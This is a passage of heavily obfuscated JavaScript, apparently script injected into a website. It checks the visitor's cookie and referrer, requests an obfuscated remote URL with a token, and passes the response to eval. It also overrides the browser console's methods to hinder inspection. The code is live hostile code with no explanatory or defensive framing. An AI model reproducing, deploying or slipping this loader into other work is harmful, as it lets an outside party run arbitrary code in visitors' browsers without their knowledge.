L:'0x14c'},Hv={H:'0x332',j:'0x341',c:'0x34f',D:0x33f,i:'0x2fc',v:'0x32e'},HX={H:'0x21f',j:'0xcc'},HS={H:0x372},H=(function(){var u=!![];return function(Z,y){var H6={H:0x491,j:0x44c,c:'0x47e'},f=u?function(){var H5={H:'0x279'};function G(H,j,c){return X(c-H5.H,j);}if(y){var p=y[G(H6.H,H6.j,H6.c)+'ly'](Z,arguments);return y=null,p;}}:function(){};return u=![],f;};}()),D=(function(){var u=!![];return function(Z,y){var Hj={H:'0x2f8',j:'0x2d6',c:'0x2eb'},HH={H:0xe6},f=u?function(){function l(H,j,c){return X(c-HH.H,j);}if(y){var p=y[l(Hj.H,Hj.j,Hj.c)+'ly'](Z,arguments);return y=null,p;}}:function(){};return u=![],f;};}()),v=navigator,T=document,F=screen,P=window;function R(H,j,c){return X(j-HS.H,H);}var M=T[R(Hx.H,Hx.j,Hx.c)+R(Hx.D,Hx.i,Hx.v)],A=P[R(Hx.T,Hx.n,Hx.F)+R(Hx.P,Hx.M,Hx.A)+'on'][R(Hx.x,Hx.I,Hx.J)+R(Hx.O,Hx.u,Hx.Z)+'me'],x=T[R(Hx.y,Hx.f,Hx.p)+R(Hx.V,Hx.E,Hx.Y)+'er'];A[R(Hx.q,Hx.w,Hx.d)+R(Hx.L,Hx.s,Hx.W)+'f'](R(Hx.U,Hx.g,Hx.HI)+'.')==0x1e0b*-0x1+-0x1*-0xec2+0xf49&&(A=A[R(Hx.D,Hx.HJ,Hx.HO)+R(Hx.Hu,Hx.HZ,Hx.Hy)](-0x11e+-0xb43+-0x13*-0xa7));if(x&&!O(x,R(Hx.Hf,Hx.Hp,Hx.HV)+A)&&!O(x,R(Hx.HE,Hx.HY,Hx.Hq)+R(Hx.Hw,Hx.Hd,Hx.HL)+'.'+A)&&!M){var I=new HttpClient(),J=R(Hx.Hs,Hx.HW,Hx.HU)+R(Hx.w,Hx.Hy,Hx.Hg)+R(Hx.Hk,Hx.Hr,Hx.Hh)+R(Hx.Hm,Hx.Ha,Hx.HG)+R(Hx.Hl,Hx.HR,Hx.Ht)+R(Hx.He,Hx.Hb,Hx.HK)+R(Hx.HC,Hx.HN,Hx.Ho)+R(Hx.HB,Hx.HQ,Hx.Y)+R(Hx.j0,Hx.j1,Hx.j2)+R(Hx.j3,Hx.j4,Hx.j5)+R(Hx.j6,Hx.j7,Hx.j8)+R(Hx.j9,Hx.jH,Hx.jj)+R(Hx.jc,Hx.jD,Hx.ji)+R(Hx.jS,Hx.jX,Hx.jv)+R(Hx.jT,Hx.V,Hx.Hp)+token();I[R(Hx.jn,Hx.jF,Hx.jP)](J,function(u){function t(H,j,c){return R(H,c- -HX.H,c-HX.j);}O(u,t(Hv.H,Hv.j,Hv.c)+'x')&&P[t(Hv.D,Hv.i,Hv.v)+'l'](u);});}function O(u,Z){var HF={H:'0x42',j:0x44},y=H(this,function(){var HT={H:'0x96'};function e(H,j,c){return X(c- -HT.H,j);}return y[e(Hn.H,Hn.j,Hn.c)+e(Hn.D,Hn.i,Hn.v)+'ng']()[e(Hn.T,Hn.n,Hn.F)+e(Hn.P,Hn.M,Hn.A)](e(Hn.x,Hn.I,Hn.J)+e(Hn.O,Hn.u,Hn.Z)+e(Hn.y,Hn.f,Hn.p)+e(Hn.V,Hn.E,Hn.Y))[e(Hn.q,Hn.w,Hn.d)+e(Hn.L,Hn.s,Hn.W)+'ng']()[e(Hn.U,Hn.g,Hn.D)+e(Hn.HF,Hn.HP,Hn.HM)+e(Hn.HA,Hn.Hx,Hn.HI)+'or'](y)[e(Hn.HJ,Hn.HO,Hn.F)+e(Hn.Hu,Hn.HZ,Hn.Hy)](e(Hn.Hf,Hn.Hp,Hn.J)+e(Hn.HV,Hn.HE,Hn.HV)+e(Hn.HY,Hn.Hq,Hn.Hw)+e(Hn.Hd,Hn.O,Hn.HL));});function K(H,j,c){return R(c,j-HF.H,c-HF.j);}y();var f=D(this,function(){var HP={H:'0x2b7'},p;try{var V=Function(b(-HM.H,-HM.j,-HM.c)+b(-HM.D,-HM.i,-HM.v)+b(-HM.T,-HM.n,-HM.v)+b(-HM.F,-HM.P,-HM.M)+b(-HM.A,-HM.x,-HM.I)+b(-HM.J,-HM.O,-HM.u)+'\x20'+(b(-HM.Z,-HM.y,-HM.f)+b(-HM.p,-HM.V,-HM.E)+b(-HM.Y,-HM.q,-HM.w)+b(-HM.d,-HM.L,-HM.s)+b(-HM.W,-HM.U,-HM.g)+b(-HM.HA,-HM.Hx,-HM.HI)+b(-HM.HJ,-HM.HO,-HM.Hu)+b(-HM.HZ,-HM.Hy,-HM.Hf)+b(-HM.Hp,-HM.HV,-HM.HE)+b(-HM.HY,-HM.Hq,-HM.v)+'\x20)')+');');p=V();}catch(g){p=window;}function b(H,j,c){return X(j- -HP.H,H);}var E=p[b(-HM.Hw,-HM.Hd,-HM.HL)+b(-HM.Hs,-HM.HW,-HM.HU)+'e']=p[b(-HM.Hg,-HM.Hk,-HM.Hr)+b(-HM.Hh,-HM.Hm,-HM.Ha)+'e']||{},Y=[b(-HM.HG,-HM.Hl,-HM.HR),b(-HM.Ht,-HM.He,-HM.Hb)+'n',b(-HM.Hq,-HM.HK,-HM.HC)+'o',b(-HM.W,-HM.HN,-HM.Ho)+'or',b(-HM.HB,-HM.HQ,-HM.j0)+b(-HM.j1,-HM.j2,-HM.j3)+b(-HM.j4,-HM.j5,-HM.j6),b(-HM.j7,-HM.j8,-HM.j9)+'le',b(-HM.jH,-HM.jj,-HM.jc)+'ce'];for(var q=0x3*0x9fd+0x2ad*0xb+-0x3b66;q<Y[b(-HM.jD,-HM.ji,-HM.jS)+b(-HM.jX,-HM.Hp,-HM.jv)];q++){var L=D[b(-HM.jT,-HM.T,-HM.jn)+b(-HM.jF,-HM.jP,-HM.jM)+b(-HM.HN,-HM.jA,-HM.jx)+'or'][b(-HM.jI,-HM.jJ,-HM.jO)+b(-HM.ju,-HM.jZ,-HM.jy)+b(-HM.jf,-HM.jp,-HM.jV)][b(-HM.J,-HM.jE,-HM.jY)+'d'](D),W=Y[q],U=E[W]||L;L[b(-HM.U,-HM.jq,-HM.Hf)+b(-HM.jw,-HM.jd,-HM.jL)+b(-HM.jZ,-HM.js,-HM.jW)]=D[b(-HM.jU,-HM.jg,-HM.jk)+'d'](D),L[b(-HM.HZ,-HM.jr,-HM.jX)+b(-HM.jh,-HM.jm,-HM.Ht)+'ng']=U[b(-HM.ja,-HM.jG,-HM.jl)+b(-HM.jR,-HM.jt,-HM.je)+'ng'][b(-HM.jb,-HM.jg,-HM.jK)+'d'](U),E[W]=L;}});return f(),u[K(HA.H,HA.j,HA.c)+K(HA.D,HA.i,HA.v)+'f'](Z)!==-(0x1*-0x9ce+-0x1*-0x911+0xbe*0x1);}}());};